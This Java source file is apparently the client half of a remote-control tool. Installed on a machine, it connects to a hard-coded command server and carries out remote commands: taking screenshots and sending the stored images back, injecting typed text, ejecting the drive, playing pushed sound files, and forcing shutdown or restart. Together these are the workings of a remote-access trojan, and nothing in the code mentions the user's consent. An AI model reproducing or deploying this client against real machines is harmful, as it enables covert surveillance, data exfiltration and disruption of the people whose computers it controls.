import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.util.Stack;

/**
 * the program that runs on each clients machine. The Client class
 * connects to the Server and waits for instructions
 */
public class Client
{
    private static final int SERVER_PORT = 0xbeef;
    private static final String SERVER_IP_ADDRESS = "127.0.0.1";
    private Socket socket;
    private CommandSet commandSet;

    public Client() throws IOException, UnknownOperatingSystemException, AWTException
    {
        commandSet = setCommandSet();
        connectAndListen();
    }

    /**
     * gets the appropriate command set for the OS that the client is running
     * @return the CommandSet that will work on the clients operating system
     * @throws UnknownOperatingSystemException if the operating system is unrecognised
     */
    private CommandSet setCommandSet() throws UnknownOperatingSystemException
    {
        String operatingSystem = System.getProperty("os.name");
        if(operatingSystem.equals("Linux"))
            return new LinuxCommandSet();
        if(operatingSystem.startsWith("Windows"))
            return new WindowsCommandSet();
        if(operatingSystem.startsWith("Mac"))
            return new MacCommandSet();

        throw new UnknownOperatingSystemException("Client OS not Linux, Mac or Windows");
    }

    /**
     * connects to the command server and waits for commands
     * @throws IOException if something went wrong connecting to the command server
     */
    private void connectAndListen() throws IOException, AWTException
    {
        socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
        BufferedReader inFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));

        while(socket.isConnected())
        {
            String serverCommand = inFromServer.readLine(); // blocks

            System.out.println("Command: " + serverCommand);
            if(serverCommand.equals("type") || serverCommand.equals("sound")) // 1 arg commands
                processServerCommand(serverCommand, inFromServer.readLine());
            else if(serverCommand.equals("chaos")) // 2 arg commands
                processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine());
            else if(serverCommand.equals("msg")) // 4 arg commands
                processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine(), inFromServer.readLine());
            else
                processServerCommand(serverCommand);
        }
    }

    /**
     * gets a file sent from the server
     * @param size the size of the file the server sent us
     * @return the file the server sent
     * @throws IOException error reading file stream
     */
    private File getSoundFileFromServer(int size) throws IOException
    {
        File sound = File.createTempFile("sou", ".wav", new File(commandSet.getTempPath()));
        byte[] buffer = new byte[size];
        InputStream in = socket.getInputStream();

        FileOutputStream fos = new FileOutputStream(sound);

        int count;
        int bytesRead = 0;
        System.out.println("About to read " + size + " bytes sound file");
        while (bytesRead != size && (count = in.read(buffer)) > 0)
        {
            bytesRead += count;
            System.out.println("client bytes read count: " + bytesRead);
            fos.write(buffer, 0, count);
            //fos.flush(); // todo: needed?
        }
        System.out.println("Done file transfer");


        fos.close();
        System.out.println("Returning sound file");
        return sound;
    }

    /**
     * for sending data on the clients machine back to the server. e.g. screenshots
     * @param toSend the file that needs to be sent
     * @throws IOException if something went wrong sending the file
     */
    public void sendFile(File toSend) throws IOException
    {
        byte[] buffer = new byte[(int)toSend.length()]; // todo: better way of sizing
        InputStream in = new FileInputStream(toSend);
        OutputStream out = socket.getOutputStream();

        int count;
        while ((count = in.read(buffer)) > 0)
            out.write(buffer, 0, count);

        //out.flush();
        in.close();
    }

    /**
     * calls the appropriate method on the CommandSet depending on what the server wants us to do to
     * the client
     * @param serverCommand the command from the server and optionally extra arguments (msg command for example provides a msg arg)
     */
    private void processServerCommand(String... serverCommand) throws IOException, AWTException
    {
        switch(serverCommand[0].toLowerCase())
        {
            case "eject":
                commandSet.eject();
                return;
            case "sound": // special case: sound requires the sound file from the server so we must retrieve it
                try
                {
                    int fileSize = Integer.valueOf(serverCommand[1]);
                    new Thread(new MakeSound(getSoundFileFromServer(fileSize))).start();
                }
                catch(Exception e)
                {
                    System.out.println("play sound excelption");
                    e.printStackTrace();
                }
                return;
            case "screenshot":
                commandSet.takeScreenshot();
                return;
            case "msg":
                commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
                return;
            case "shutdown":
                commandSet.shutdown();
                return;
            case "restart":
                commandSet.restart();
                return;
            case "chaos":
                commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                break;
            case "type":
                commandSet.type(serverCommand[1]);
                break;
            case "retrieve":
                sendAllImages();
                break;
            default:
                System.out.println("Reached default in processSErverCommand with cmd: " + serverCommand);
        }
    }

    private void sendAllImages()
    {
        File[] allImages = new File(commandSet.getTempPath()).listFiles();
        for(File file : allImages)
        {
            if(file.getName().endsWith(".jpg"))
            {
                try
                {
                    sendFile(file);
                }
                catch(IOException ioe)
                {
                    ioe.printStackTrace();
                }
            }
        }
    }
}
